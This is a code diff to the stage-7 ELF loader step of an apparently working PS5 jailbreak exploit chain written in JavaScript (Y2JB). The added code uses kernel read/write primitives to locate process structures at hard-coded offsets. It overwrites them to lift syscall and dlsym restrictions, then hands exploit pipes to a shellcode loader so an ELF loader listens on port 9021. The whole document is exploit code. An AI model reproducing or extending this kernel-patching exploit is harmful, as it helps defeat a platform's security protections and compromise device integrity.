@@ -1643,7 +1643,7 @@
 
         async function stage_load_elf(S) {
 
-            await ulog("stage_elfldr: entered");
+            await ulog("stage_elfldr: entered (Y2JB 1.4 aioshellcode handoff)");
             if (!LAUNCH_ELF_LOADER) {
                 await ulog("stage_elfldr: LAUNCH_ELF_LOADER=false - skipped");
                 return;
@@ -1655,76 +1655,53 @@
                 return;
             }
             try {
-                if (typeof elf_parse !== "function" || typeof elf_run !== "function" ||
-                    typeof elf_wait_for_exit !== "function" ||
-                    typeof ipv6_kernel_rw === "undefined") {
-                    await ulog("stage_elfldr: framework elf_parse/elf_run/" +
-                        "elf_wait_for_exit/ipv6_kernel_rw not in scope - skipped");
-                    send_notification("Stage 7\nelf loader unavailable - skipped");
+                if (typeof load_aioshellcode !== "function") {
+                    await ulog("stage_elfldr: load_aioshellcode not in scope - " +
+                        "the PS5 must be running Y2JB >= 1.4");
+                    send_notification("Stage 7\nUpdate the PS5 to Y2JB 1.4\n" +
+                        "(elf loader skipped)");
                     return;
                 }
 
-                await ulog("stage_elfldr: scanning /mnt/usb0..7 for elfldr...");
-                const usb_names = ["elfldr_1320.elf", "elfldr.elf"];
-                let elf_path = null;
-                for (let u = 0; u < 8 && !elf_path; u++) {
-                    for (const name of usb_names) {
-                        const p = "/mnt/usb" + u + "/" + name;
-                        if (file_exists(p)) { elf_path = p; break; }
-                    }
-                }
-                if (!elf_path) {
-                    await ulog("stage_elfldr: elfldr not found on /mnt/usb0../usb7");
-                    send_notification("Stage 7\nelfldr_1320.elf NOT FOUND on USB\n" +
-                        "(plug a FAT32/exFAT USB with elfldr_1320.elf)");
-                    return;
-                }
-                await ulog("stage_elfldr: found " + elf_path);
+                const is_kptr = (v) =>
+                    (v & 0xFFFF000000000000n) === 0xFFFF000000000000n;
 
-                ipv6_kernel_rw.init(S.fd_ofiles, S.kread64, S.kwrite64);
-                kernel.addr.data_base = S.data_base;
-                await ulog("stage_elfldr: ipv6_kernel_rw built (master_sock=" +
-                    ipv6_kernel_rw.data.master_sock + " victim_sock=" +
-                    ipv6_kernel_rw.data.victim_sock + ")");
+                const p_dynlib = S.kread64(S.curproc + 0x3E8n);
+                if (!is_kptr(p_dynlib))
+                    throw new Error("p_dynlib not a kptr: " + toHex(p_dynlib));
+                const dynlib_eboot = S.kread64(p_dynlib + 0x00n);
+                if (!is_kptr(dynlib_eboot))
+                    throw new Error("dynlib_eboot not a kptr: " + toHex(dynlib_eboot));
+                const eboot_segments = S.kread64(dynlib_eboot + 0x40n);
+                if (!is_kptr(eboot_segments))
+                    throw new Error("eboot_segments not a kptr: " + toHex(eboot_segments));
+                await ulog("stage_elfldr: dynlib=" + toHex(p_dynlib) +
+                    " eboot=" + toHex(dynlib_eboot) +
+                    " segs=" + toHex(eboot_segments));
 
-                const pin_sock = (fd) => {
-                    const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
-                    if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
-                    const so = S.kread64(fp);
-                    if (so === 0n || (so >> 48n) !== 0xFFFFn) return;
-                    S.kwrite32(so, 0x100);
-                };
-                pin_sock(ipv6_kernel_rw.data.master_sock);
-                pin_sock(ipv6_kernel_rw.data.victim_sock);
+                S.kwrite64(p_dynlib + 0xF0n, 0n);
+                S.kwrite64(p_dynlib + 0xF8n, 0xFFFFFFFFFFFFFFFFn);
+                S.kwrite64(eboot_segments + 0x08n, 0n);
+                S.kwrite64(eboot_segments + 0x10n, 0xFFFFFFFFFFFFFFFFn);
+                await ulog("stage_elfldr: dynlib patched " +
+                    "(syscalls + dlsym unrestricted)");
 
-                const pin_pipe_fd = (fd) => {
-                    const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
-                    if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
-                    const rc = S.kread32(fp + 0x28n);
-                    if (rc > 0n && rc < 0x10000n)
-                        S.kwrite32(fp + 0x28n, Number(rc) + 0x100);
-                };
-                pin_pipe_fd(ipv6_kernel_rw.data.pipe_read_fd);
-                pin_pipe_fd(ipv6_kernel_rw.data.pipe_write_fd);
-                await ulog("stage_elfldr: handoff pipe + sockets pinned");
+                const allproc = S.data_base + S.OFF.DATA_BASE_ALLPROC;
+                const master_pipe = [BigInt(S.master_rfd), BigInt(S.master_wfd)];
+                const victim_pipe = [BigInt(S.victim_rfd), BigInt(S.victim_wfd)];
+                await ulog("stage_elfldr: handoff -> load_aioshellcode " +
+                    "(allproc=" + toHex(allproc) +
+                    " master=" + S.master_rfd + "," + S.master_wfd +
+                    " victim=" + S.victim_rfd + "," + S.victim_wfd + ")");
 
-                const elf_data = read_file(elf_path);
-                await ulog("stage_elfldr: read " + elf_data.length +
-                    " bytes; parsing...");
-                const entry = await elf_parse(elf_data);
-                await ulog("stage_elfldr: elf entry=" + toHex(entry) +
-                    "; spawning elfldr...");
-                const { thr_handle, payloadout } = await elf_run(entry, elf_path);
+                await load_aioshellcode(allproc, master_pipe, victim_pipe);
 
-                await ulog("stage_elfldr: elfldr spawned - joining...");
-                await elf_wait_for_exit(thr_handle, payloadout);
-                const out = read32(payloadout);
-                await ulog("stage_elfldr: Thrd join done, payloadout = " + toHex(out));
-                await ulog("stage_elfldr: daemon should be listening on :9021");
+                await ulog("stage_elfldr: load_aioshellcode returned - " +
+                    "elfldr should now be listening on :9021");
                 send_notification("Stage 7\nelfldr running - send your ELF to\n" +
                     "<ps5-ip>:9021  (e.g. BD-UN-JB unpatcher)");
             } catch (e) {
-                await ulog("stage_elfldr: failed: " + e.message);
+                await ulog("stage_elfldr: kexp handoff failed: " + e.message);
                 send_notification("Stage 7\nelfldr failed: " + e.message +
                     "\n(jailbreak still complete)");
             }
